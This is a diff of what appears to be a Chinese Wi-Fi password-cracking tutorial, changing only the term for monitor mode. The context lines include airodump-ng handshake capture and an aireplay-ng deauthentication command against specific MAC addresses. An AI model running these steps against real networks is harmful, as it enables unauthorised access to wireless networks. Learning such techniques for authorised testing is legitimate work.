@@ -20,7 +20,7 @@ tags:
 
 ### 1. 检查无线网卡是否支持监听模式
 
-如果自己电脑物理机装的就是 Linux 系统，直接执行 iw list，检查输出是否有“monitor”字样，如果没有，需要自行准备支持监控模式的 USB 网卡之类的东西，我用的是在淘宝买的 MT7921 USB 无线网卡。
+如果自己电脑物理机装的就是 Linux 系统，直接执行 iw list，检查输出是否有“monitor”字样，如果没有，需要自行准备支持监听模式的 USB 网卡之类的东西，我用的是在淘宝买的 MT7921 USB 无线网卡。
 
 ```bash
 iw list
@@ -30,7 +30,7 @@ iw list
 #         * managed
 #         * AP
 #         * AP/VLAN
-#         * monitor # 监控模式
+#         * monitor # 监听模式
 #         * P2P-client
 #         * P2P-GO
 # ...
@@ -82,7 +82,7 @@ airodump-ng --bssid 2C:B2:1A:22:51:86 -c 3 -w ~/Wi-Fi_capture wlan0mon
 aireplay-ng --deauth 10 -a 2C:B2:1A:22:51:86 -c 9C:5A:81:2A:C1:49 wlan0mon
 ```
 
-捕捉到握手包后就可以执行 `airmon-ng stop wlan0mon` 停止监控模式了
+捕捉到握手包后就可以执行 `airmon-ng stop wlan0mon` 停止监听模式了
 
 ### 6. 使用字典破解 Wi-Fi 密码
 
